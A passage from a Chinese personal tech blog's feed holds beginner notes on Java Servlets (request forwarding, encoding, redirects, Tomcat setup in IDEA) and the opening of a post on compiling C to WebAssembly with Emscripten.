class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;HttpServlet&#x2F;httpServlet?a&#x3D;test&amp;a&#x3D;123&#x2F;&#x2F;a有多个值</span><br></pre></td></tr></table></figure><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503130827652.png" alt="image-20210503130827652"></p><p>但是注意，POST请求中获取参数时如果是中文时会乱码，此时需要设置编码</p><p>首先写一个post请求的表单</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503131343854.png" alt="image-20210503131343854"></p><p>java类中填写doPost</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503131453467.png" alt="image-20210503131453467"></p><p>重新部署，访问：<a href="http://localhost:8080/HttpServlet/test.html" target="_blank" rel="noopener">http://localhost:8080/HttpServlet/test.html</a></p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503131553126.png" alt="image-20210503131553126"></p><p>点击提交后</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503131610200.png" alt="image-20210503131610200"></p><p>乱码了。需要设置编码</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503131724958.png" alt="image-20210503131724958"></p><p>设置编码必须在开头就设置。</p><h2 id="请求转发"><a href="#请求转发" class="headerlink" title="请求转发"></a>请求转发</h2><p>客户端发送给服务端的servlet后，该servlet又转发给另一个servlet，从而达到一次请求有多个servlet处理的效果。</p><p>新建servlet1和servlet2，并配置好web.xml</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503143954637.png" alt="image-20210503143954637"></p><p>在servlet1中</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503144617410.png" alt="image-20210503144617410"></p><p>首先获取请求的参数，然后设置一个域对象数据，然后转发请求。注意，转发请求时，需要转发的目的的相对路径（web.xml)中配置的路径，而不是类名，因此这里是/servlet2。</p><p>servlet2中</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503145152104.png" alt="image-20210503145152104"></p><p>首先获取请求的参数，然后获取request对象的域数据，判断servlet1是否已经处理过，然后servlet2处理。</p><p>访问servlet1：<a href="http://localhost:8080/HttpServlet/servlet1?username=root" target="_blank" rel="noopener">http://localhost:8080/HttpServlet/servlet1?username=root</a></p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503145423964.png" alt="image-20210503145423964"></p><p>成功转发并接收。</p><p>需要注意点是：</p><ol><li><p>虽然使用两个servlet处理，但是浏览器地址没有变化，还是访问的servlet1.</p></li><li><p>只是一次请求。</p></li><li><p>共享Request对象域中的数据。</p></li><li><p>浏览器直接访问WEB-INF目录下的文件是404的，如果转发请求的话，可以转发到WEB-INF目录下的文件。</p></li><li><p>不能转发到工程外的文件。</p></li></ol><h2 id="base标签的作用"><a href="#base标签的作用" class="headerlink" title="base标签的作用"></a>base标签的作用</h2><p>base标签是用来作为参照的路径的，请求转发是使用相对路径的，如果没有参照的基地址路径，很容易造成地址错误。</p><p>在web目录下新建一个目录a, a下新建一个目录b, b下新建一个c.html</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503150737741.png" alt="image-20210503150737741"></p><p>可以跳回test.html, 然后修改test.html</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503150838517.png" alt="image-20210503150838517"></p><p>然后访问：<a href="http://localhost:8080/HttpServlet/test.html" target="_blank" rel="noopener">http://localhost:8080/HttpServlet/test.html</a></p><p>两个HTML文件可以互相成功跳转。但是如果使用请求转发的方式就会出现问题：</p><p>新建Servlet：ForwardC</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503151141975.png" alt="image-20210503151141975"></p><p>将请求转发到a/b/c.html中。web.xml配置路径</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503151249092.png" alt="image-20210503151249092"></p><p>修改test.html</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503151335106.png" alt="image-20210503151335106"></p><p>因此可知，test.html跳转到FowardC, 然后FowardC将请求转发到c.html, 之后在c.html中点击跳转回test.html，然鹅真能跳回？</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503151541065.png" alt="image-20210503151541065"></p><p>这是因为请求转发时候，转发跳转到了c.html, 但是URL地址并没有变化</p><p><a href="http://localhost:8080/HttpServlet/ForwardC" target="_blank" rel="noopener">http://localhost:8080/HttpServlet/ForwardC</a></p><p>还是ForwardC, 因此导致了c.html中跳转回test.html的<code>../../test.html</code>失败，地址变成了：</p><p><a href="http://localhost:8080/test.html" target="_blank" rel="noopener">http://localhost:8080/test.html</a></p><p>因此需要base标签确定跳转的参照地址</p><p>在c.html中</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503151928719.png" alt="image-20210503151928719"></p><p>即可成功跳转。</p><h1 id="HttpServletResponse类"><a href="#HttpServletResponse类" class="headerlink" title="HttpServletResponse类"></a>HttpServletResponse类</h1><p>与Request一样，请求进来后，tomcat服务器都会生成一个Response对象，作为参数传到doGet或doPost中供我们使用。之前的输出都是在IDEA中打印的，而这个Response可以向客户端返回数据显示在客户端。</p><ul><li>getWriter()，字符流，返回字符串数据。</li><li>getOutputStream(), 字节流，返回的是二进制数据，通常用于下载。</li></ul><p>两种方法同时只能用其一。</p><h2 id="返回数据"><a href="#返回数据" class="headerlink" title="返回数据"></a>返回数据</h2><p>新建一个Response类，同时配置好访问路径，在类中的doGet方法中响应返回字符串数据。</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503175854087.png" alt="image-20210503175854087"></p><p>访问之后即可看到返回的数据。</p><p>如果是中文的话会乱码，因此还需要设置字符集是UTF-8.浏览器编码也要设置哦。</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503180345800.png" alt="image-20210503180345800"></p><p><strong>另有一个方法可以同时设置响应和浏览器编码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resp.setContentType(&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;)</span><br></pre></td></tr></table></figure><p>设置编码一定要在获取流对象即getWriter()方法之前使用。</p><h2 id="请求重定向"><a href="#请求重定向" class="headerlink" title="请求重定向"></a>请求重定向</h2><p><strong>第一种方案</strong></p><p>客户端向服务器发起一个请求，服务器响应时，将状态码修改成302，设置响应头是Location: URL, 这样客户端接受后就会重定向到新的URL地址。</p><p>新建Response1和Response2，配置web.xml的访问路径</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503181644543.png" alt="image-20210503181644543"></p><p>重新部署，然后访问response1</p><p><img src="/2021/05/02/JavaWeb%E5%AD%A6%E4%B9%A0-2/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503181725946.png" alt="image-20210503181725946"></p><p>成功跳转到了Response2。</p><p>特点：</p><ol><li>URL地址变化</li><li>两次请求</li><li>不能共享域中的数据</li><li>不能跳转到WEB-INF中的资源文件</li><li>可以跳转到工程外的域名</li></ol><p><strong>第二种方案</strong></p><p>直接使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resp.sendRedirect(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天继续学习JavaWeb的Servlet.&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaWeb" scheme="https://ggyggy666.github.io/categories/JavaWeb/"/>
    
    
      <category term="JavaWeb学习" scheme="https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb学习(1)</title>
    <link href="https://ggyggy666.github.io/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/"/>
    <id>https://ggyggy666.github.io/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/</id>
    <published>2021-05-01T10:04:38.000Z</published>
    <updated>2021-05-02T14:59:55.784Z</updated>
    
    <content type="html"><![CDATA[<p>今天开始好好学习JavaWeb。</p><a id="more"></a><p>主要是配合IDEA使用。</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="IDEA添加tomcat"><a href="#IDEA添加tomcat" class="headerlink" title="IDEA添加tomcat"></a>IDEA添加tomcat</h2><p>前提：需要JAVA_HOME环境变量。</p><p>下载tomcat压缩包，解压后，在bin目录下点击startup.bat启动tomcat, 之后可以访问本地的8080端口看是否成功部署。成功后就可以关掉了。</p><p>IDEA中，进入settings设置，然后</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501181023506.png" alt="image-20210501181023506"></p><p>浏览目录，找到tomcat的安装目录，并确认</p><p><img src="https://i.loli.net/2021/05/01/Otf7NRo3UIwivZr.png" alt="image-20210501181121055"></p><p>自动显示出来了tomcat版本，确认后即可看到</p><p><img src="https://i.loli.net/2021/05/01/WlUXIQZhrgxFutf.png" alt="image-20210501181201515"></p><h2 id="新建JavaWeb工程"><a href="#新建JavaWeb工程" class="headerlink" title="新建JavaWeb工程"></a>新建JavaWeb工程</h2><p>点击File-&gt;new-&gt;new project，新建工程</p><p><img src="https://i.loli.net/2021/05/01/bEsZAdU4Mm5OurV.png" alt="image-20210501181332404"></p><p>按图中所示操作即可，之后next，输入项目名确认即可。</p><h2 id="导入第三方库"><a href="#导入第三方库" class="headerlink" title="导入第三方库"></a>导入第三方库</h2><p>首先在WEB-INF目录下新建一个lib目录，用来保存jar包</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501181635941.png" alt="image-20210501181635941"></p><p>导入第三方库有两种方法：</p><ol><li><p>复制jar包，鼠标移到lib目录，右键选择粘贴。然后再移到jar包，右键，选择：Add as library</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501181851414.png" alt="image-20210501181851414"></p></li><li><p>点击File-&gt;Project Structure</p><p><img src="https://i.loli.net/2021/05/01/Exzk2KvmiCDjt7B.png" alt="image-20210501181947452"></p><p>点击Libraries, 点击+</p><p><img src="https://i.loli.net/2021/05/01/VkC4glRZXOndEPw.png" alt="image-20210501182034698"></p><p>选择Java，然后浏览到jar包位置</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501182130167.png" alt="image-20210501182130167"></p><p>之后都是OK。然后点击Artifacts</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501182233103.png" alt="image-20210501182233103"></p><p>点击Fix, 选择添加</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501182321357.png" alt="image-20210501182321357"></p><p>OK之后可以在外部库中看到</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501182352781.png" alt="image-20210501182352781"></p></li></ol><h1 id="修改tomcat配置"><a href="#修改tomcat配置" class="headerlink" title="修改tomcat配置"></a>修改tomcat配置</h1><p>点击tomcat的配置进行编辑</p><p><img src="https://i.loli.net/2021/05/01/l5QTvqeWpdChUXx.png" alt="image-20210501182450280"></p><p>在Deployment中可以修改本项目的访问路径</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501182539202.png" alt="image-20210501182539202"></p><p>最好与工程名一致，即JavaWeb</p><p>在server中可以修改端口与热部署</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501182631195.png" alt="image-20210501182631195"></p><p>所谓热部署，就是在修改tomcat网页内容后，不用重启实例就能自动刷新网页。将On frame deactivation的值改为Update classes and resources就行。然后，On ‘Update’ action 修改为Restart server，意思是点击IDEA的tomcat的重启按钮时会默认显选中这个选项</p><p><img src="https://i.loli.net/2021/05/01/EbTFWC4B9PiA7tY.png" alt="image-20210501182916526"></p><h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><p>相当于是服务器程序，可以接受请求并响应。</p><h2 id="第一个Servlet程序"><a href="#第一个Servlet程序" class="headerlink" title="第一个Servlet程序"></a>第一个Servlet程序</h2><p>在JavaWeb目录下，new一个Web Application模块，然后在src中新建package: com.JavaWeb.servlet, 在该包下新建一个类：HelloServlet</p><p><img src="https://i.loli.net/2021/05/01/g15zS3QontHvE72.png" alt="image-20210501221949782"></p><p>然后这个类需要实现Servlet, 即添加上implements Servlet, 之后可以Alt+Enter, 自动出现需要实现的方法</p><p><img src="https://i.loli.net/2021/05/01/tVuz7aKsIT3m9G8.png" alt="image-20210501222111779"></p><p>在service方法中，输出一句话。这样当访问这个Servlet时就能打印这句话。有了Servlet程序之后，还需要给它配置访问路径。在web.xml中</p><p><img src="https://i.loli.net/2021/05/01/vG9Dsakgp28ZzMO.png" alt="image-20210501222230075"></p><p>首先添加一个servlet标签，里面是容器名以及链接到的类。然后是添加servlet-mapping, 给这个servlet配置访问路径。同样是需要容器名，后面的url-pattern即为访问目录。完整URL应为：工程所在路径+url-pattern, 工程所在路径即为tomcat配置的路径</p><p><img src="https://i.loli.net/2021/05/01/Vfaidg3utPpGHDX.png" alt="image-20210501222523594"></p><p>因此，访问：<a href="http://localhost:8080/JavaWeb/hello" target="_blank" rel="noopener">http://localhost:8080/JavaWeb/hello</a></p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501222600501.png" alt="image-20210501222600501"></p><p>输出日志将那句话打印了出来。</p><h2 id="Servlet函数执行顺序"><a href="#Servlet函数执行顺序" class="headerlink" title="Servlet函数执行顺序"></a>Servlet函数执行顺序</h2><p>首先Alt+Insert使用Generate功能为HelloServlet生成一个构造器，然后在构造函数、init、service、destroy函数下打印语句</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501223652762.png" alt="image-20210501223652762"></p><p>重启之后连续访问：<a href="http://localhost:8080/JavaWeb/hello" target="_blank" rel="noopener">http://localhost:8080/JavaWeb/hello</a></p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501223821069.png" alt="image-20210501223821069"></p><p>可以发现，构造函数和init函数只在最初访问servlet时调用，之后调用的都是service方法，而destroy函数则在点击停止tomcat时调用</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501223942868.png" alt="image-20210501223942868"></p><h2 id="区分请求类型是GET还是POST"><a href="#区分请求类型是GET还是POST" class="headerlink" title="区分请求类型是GET还是POST"></a>区分请求类型是GET还是POST</h2><p>servlet相当于服务器，接受客户端发送来的请求，那么就要识别出它是哪一种请求。</p><p>首先创建一个test.html，模拟一个form表单提交请求</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501225717489.png" alt="image-20210501225717489"></p><p>然后在Servlet的service中处理请求</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501225756466.png" alt="image-20210501225756466"></p><p>这里有一个点，HttpServletRequest是继承了servletRequest的。</p><p>首先创建一个httpServletRequest对象，然后使用getMethod()即可获得请求的方法，然后使用equals判断该请求是哪种类型。</p><p>先使用get方法，再使用post方法测试。访问：<a href="http://localhost:8080/JavaWeb/test.html" target="_blank" rel="noopener">http://localhost:8080/JavaWeb/test.html</a></p><p>点击页面的submit按钮</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501230023728.png" alt="image-20210501230023728"></p><p>将处理的内容封装成一个函数，方便日后查看</p><p><img src="https://i.loli.net/2021/05/01/I9Uyobd183OMlHq.png" alt="image-20210501230303988"></p><h2 id="继承HttpServlet"><a href="#继承HttpServlet" class="headerlink" title="继承HttpServlet"></a>继承HttpServlet</h2><p>通常在项目中，都不会直接使用实现Servlet，而是使用继承HttpServlet</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502223803026.png" alt="image-20210502223803026"></p><p>同样在doGet()和doPost()方法中自定义代码</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502223928368.png" alt="image-20210502223928368"></p><p>web.xml中配置路径</p><p><img src="https://i.loli.net/2021/05/02/GjxkhRZKn5CHD9W.png" alt="image-20210502224050044"></p><p>之后修改test.html的action为hello2, 启动tomcat，访问test.html, 点击提交</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502224257814.png" alt="image-20210502224257814"></p><h2 id="直接使用IDEA生成HttpServlet程序"><a href="#直接使用IDEA生成HttpServlet程序" class="headerlink" title="直接使用IDEA生成HttpServlet程序"></a>直接使用IDEA生成HttpServlet程序</h2><p>上述的HttpServlet程序需要手动生成，有点麻烦。IDEA提供了直接生成</p><p>new-&gt;Create New Servlet</p><p><img src="https://i.loli.net/2021/05/02/2fraJEviekLZPYB.png" alt="image-20210502224530278"></p><p>然后填写Servlet的名称</p><p><img src="https://i.loli.net/2021/05/02/CT1KErjzqOgQWHF.png" alt="image-20210502224623540"></p><p>直接出现了Servlet程序</p><p><img src="https://i.loli.net/2021/05/02/CT1KErjzqOgQWHF.png" alt></p><p>同样在web.xml中配置路径即可</p><p><img src="/2021/05/01/JavaWeb%E5%AD%A6%E4%B9%A0-1/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502225651902.png" alt="image-20210502225651902"></p><h2 id="整个Servlet体系"><a href="#整个Servlet体系" class="headerlink" title="整个Servlet体系"></a>整个Servlet体系</h2><p><img src="https://i.loli.net/2021/05/02/Kgp6vIfDbzMQWju.png" alt="image-20210502225746677"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天开始好好学习JavaWeb。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaWeb" scheme="https://ggyggy666.github.io/categories/JavaWeb/"/>
    
    
      <category term="JavaWeb学习" scheme="https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>区块链安全之WebAssembly</title>
    <link href="https://ggyggy666.github.io/2021/03/21/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BWebAssembly/"/>
    <id>https://ggyggy666.github.io/2021/03/21/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BWebAssembly/</id>
    <published>2021-03-21T10:43:31.000Z</published>
    <updated>2021-03-23T04:27:03.075Z</updated>
    
    <content type="html"><![CDATA[<p>由于EOSIO在编译智能合约时会将CPP文件编译成wasm文件，因此需要好好了解一下wasm—WebAssembly。</p><a id="more"></a><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>WebAssembly是一种新型代码，是C/C++代码编译后的目标。它是一种低级汇编语言，表现为二进制格式，但也有可读的文本格式。它的速度快。</p><ul><li>Module: 表示一个WebAssemble二进制文件，已被浏览器编译为可执行的机器码。</li><li>Memory：可调整大小的数组缓冲区。内含低级内存访问指令读取和写入的线性字节数组。</li><li>Table：可调整大小的类型化引用数组（如函数）。</li><li>Instance（实例): 一个模块，它与运行时使用的所有状态配对，包括内存，表和一组导入的值。</li></ul><p>生成wasm代码的方式：</p><ul><li><p>在线生成:</p><ol><li><a href="https://wasdk.github.io/WasmFiddle/" target="_blank" rel="noopener">https://wasdk.github.io/WasmFiddle/</a></li><li><a href="https://anonyco.github.io/WasmFiddlePlusPlus/" target="_blank" rel="noopener">https://anonyco.github.io/WasmFiddlePlusPlus/</a></li><li><a href="https://mbebenita.github.io/WasmExplorer/" target="_blank" rel="noopener">https://mbebenita.github.io/WasmExplorer/</a></li></ol></li><li><p>Emscripten工具: </p><p><a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/Emscripten" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Mozilla/Projects/Emscripten</a></p><p>这个功能更完善。</p></li></ul><h1 id="C-C-程序编译成wasm文件"><a href="#C-C-程序编译成wasm文件" class="headerlink" title="C/C++程序编译成wasm文件"></a>C/C++程序编译成wasm文件</h1><p>首先下载Emscripten工具：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;gitee.com&#x2F;ggy666&#x2F;emsdk1.git</span><br><span class="line">cd emsdk1</span><br><span class="line"></span><br><span class="line">#更新emsdk</span><br><span class="line">git pull</span><br><span class="line">.&#x2F;emsdk install latest&#x2F;&#x2F;下载一堆必要的东西</span><br><span class="line">.&#x2F;emsdk activate latest</span><br><span class="line">source .&#x2F;emsdk_env.sh</span><br></pre></td></tr></table></figure><h2 id="例子一"><a href="#例子一" class="headerlink" title="例子一"></a>例子一</h2><p>hello.c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;Hello World\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Emscripten编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emcc hello.c -s WASM&#x3D;1 -o hello.html</span><br></pre></td></tr></table></figure><p>-s WASM=1，指定需要输出wasm文件，否则它只会输出js文件。运行命令后会存在: hello.wasm, hello.js, hello.html。</p><p>在火狐或者谷歌浏览器直接打开hello.html, 由于使用的是file://协议，无法成功执行。</p><p><img src="https://i.loli.net/2021/03/21/cmwj5IPV8sJ4CaT.png" alt="image-20210321202446990"></p><p>需要将该HTML文件，js文件和wasm文件三个都放到本地服务器之上，这里使用的是PHPStudy。然后浏览器中访问: <code>http://127.0.0.1:xxxx/hello.html</code>。</p><p><img src="https://i.loli.net/2021/03/21/kbWgVvqRFAI2xPm.png" alt="image-20210321202559906"></p><p>成功打印出来了。</p><h2 id="使用自定义HTML模板"><a href="#使用自定义HTML模板" class="headerlink" title="使用自定义HTML模板"></a>使用自定义HTML模板</h2><p>还是hello2.c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;Hello World\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到shell_minimal.html, 将其复制到html_template目录下。然后运行命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emcc -o hello2.html hello.c -O3 -s WASM&#x3D;1 --shell-file html_template&#x2F;shell_minimal.html</span><br></pre></td></tr></table></figure><p>使用了–shell-file指定了一个HTML模板，那么生成的hello2.html就是这个模板生成的。</p><p><img src="https://i.loli.net/2021/03/21/xwXRsC17AeOKJnf.png" alt="image-20210321202918737"></p><h2 id="调用C中定义的自定义函数"><a href="#调用C中定义的自定义函数" class="headerlink" title="调用C中定义的自定义函数"></a>调用C中定义的自定义函数</h2><p>hello3.c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;emscripten&#x2F;emscripten.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;Hello World\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern &quot;C&quot; &#123;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">EMSCRIPTEN_KEEPALIVE void myFunction(int argc, char ** argv) &#123;</span><br><span class="line">    printf(&quot;MyFunction Called\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>本来有效代码只有main函数，但是使用了EMSCRIPTEN_KEEPALIVE声明之后myFunction也是有效代码了。但是还需要设置NO_EXIT_RUNTIME=1, 不然main执行完后就退出了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emcc -o hello3.html hello3.c -O3 -s WASM&#x3D;1 --shell-file html_template&#x2F;shell_minimal.html -s NO_EXIT_RUNTIME&#x3D;1  -s &quot;EXTRA_EXPORTED_RUNTIME_METHODS&#x3D;[&#39;ccall&#39;]&quot;</span><br></pre></td></tr></table></figure><p>照常打开hello3.html后，跟之前一样。要看到运行myFunction函数的效果，需要编辑器中打开hello3.html，（sublime text中打开的html文件代码全都是贴在一块的，需要prettify。<a 